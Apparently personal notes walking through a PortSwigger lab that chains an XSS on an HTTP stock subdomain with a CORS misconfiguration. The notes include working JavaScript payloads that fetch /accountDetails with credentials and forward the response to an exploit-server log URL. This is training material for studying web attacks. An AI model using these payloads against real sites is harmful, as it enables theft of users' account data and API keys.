# [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

> this lab exploits an XSS and a CORS vulnerability

- an application that employs HTTPS also whitelists a trusted subdomain that is using plain HTTP

request:

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

->

response

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

> an attack like this involves the following steps:

- The victim user makes any plain HTTP request.
- The attacker injects a redirection to: `http://trusted-subdomain.vulnerable-website.com`
- The victim's browser follows the redirect.
- The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: `https://vulnerable-website.com`
- The victim's browser makes the CORS request, including the origin: `http://trusted-subdomain.vulnerable-website.com`
- The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
- The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.

## the exploit

> `CORS` part

- log in the website and check the `/accountDetails` for `CORS`
- in repeater add the `Origin: http://subdomain.lab-id` to the request
- `CORS` vulnerable to protocol change and subdomain addition

```
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open("get", "https://xxx.web-security-academy.net/accountDetails", true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location = "https://yyy.exploit-server.net/log?key=" + this.responseText;
  }
</script>
```

> `XSS` part

- check any product by clicking the `Check Stock` button
- the request `https://xxx.web-security-academy.net/product?productId=4` vulnerable to `XSS`
- `/productId=4<script>alert()</script>` will give back the alert
- in burp repeater:

```
GET /?productId=4<script>alert()</script>&storeId=1 HTTP/2
Host: stock.xxx.web-security-academy.net
```

->

```
<script>
  document.location = "http://stock.xxx.web-security-academy.net/?productId=4<script>...</script>&storeId=1";
</script>
```

> combining the two script for the exploit

```
<script>
    document.location="http://stock.xxx.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://xxx.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://yyy.exploit-server.net/log?key='+this.responseText; };</script>&storeId=1"
</script>
```

url decode ->

```
<script>
    document.location="http://stock.xxx.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://xxx.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://yyy.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
